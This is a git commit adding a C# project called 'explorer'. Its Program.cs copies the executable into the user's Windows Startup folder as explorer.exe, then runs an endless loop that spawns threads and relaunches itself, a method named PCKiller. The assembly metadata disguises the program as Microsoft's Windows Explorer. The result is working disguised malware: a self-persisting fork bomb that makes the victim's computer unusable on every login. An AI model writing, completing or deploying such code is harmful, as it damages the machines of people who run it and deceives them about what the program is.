5bfa79cd593790b2876d0f27a19a00a97158a5bf
Bobby <Bobby@DESKTOP-SE1KP01>
2016-09-26 19:18:28 -0500

    Add project files.

---
+++ explorer/Program.cs
@@ -0,0 +1,54 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Threading;
+using System.IO;
+using System.Windows;
+using System.Diagnostics;
+
+namespace explorer
+{
+    class Program
+    {
+
+        static void Main(string[] args)
+        {
+            try
+            {
+                copyFile();
+            }
+            catch (Exception e)
+            {
+
+            }
+            PCKiller();
+        }
+
+        static void PCKiller()
+        {
+            int i;
+            i = 0;
+            Thread pckiller = new Thread(new ThreadStart(PCKiller));
+            string filePath = Directory.GetCurrentDirectory();
+            string fileName = AppDomain.CurrentDomain.FriendlyName;
+            string fileLocation = (filePath + (char)92 + fileName);
+            while (true)
+            {
+                i++;
+                pckiller.Start();
+                Process.Start(fileLocation.ToString());
+            }
+        }
+
+        static void copyFile()
+        {
+            string filePath = Directory.GetCurrentDirectory();
+            string fileName = AppDomain.CurrentDomain.FriendlyName;
+            string fileLocation = (filePath + (char)92 + fileName);
+            string startupLocation = (Environment.GetEnvironmentVariable("USERPROFILE") + (char)92 + "AppData" + (char)92 + "Roaming" + (char)92 + "Microsoft" + (char)92 + "Windows" + (char)92 + "Start Menu" + (char)92 + "Programs" + (char)92 + "Startup" + (char)92 + "explorer.exe");
+            File.Copy(fileLocation, startupLocation);
+        }
+    }
+}
---
+++ explorer/Properties/AssemblyInfo.cs
@@ -0,0 +1,36 @@
+﻿using System.Reflection;
+using System.Runtime.CompilerServices;
+using System.Runtime.InteropServices;
+
+// General Information about an assembly is controlled through the following 
+// set of attributes. Change these attribute values to modify the information
+// associated with an assembly.
+[assembly: AssemblyTitle("Windows Explorer")]
+[assembly: AssemblyDescription("Windows Explorer")]
+[assembly: AssemblyConfiguration("")]
+[assembly: AssemblyCompany("Microsoft Corporation")]
+[assembly: AssemblyProduct("Microsoft® Windows® Operating System")]
+[assembly: AssemblyCopyright("© Microsoft Corporation. All rights reserved.")]
+[assembly: AssemblyTrademark("")]
+[assembly: AssemblyCulture("")]
+
+// Setting ComVisible to false makes the types in this assembly not visible 
+// to COM components.  If you need to access a type in this assembly from 
+// COM, set the ComVisible attribute to true on that type.
+[assembly: ComVisible(false)]
+
+// The following GUID is for the ID of the typelib if this project is exposed to COM
+[assembly: Guid("811cdf1d-fc5b-4969-bc03-6bd77a2c63d6")]
+
+// Version information for an assembly consists of the following four values:
+//
+//      Major Version
+//      Minor Version 
+//      Build Number
+//      Revision
+//
+// You can specify all the values or you can default the Build and Revision Numbers 
+// by using the '*' as shown below:
+// [assembly: AssemblyVersion("1.0.*")]
+[assembly: AssemblyVersion("10.0.14393.0")]
+[assembly: AssemblyFileVersion("10.0.14393.0")]
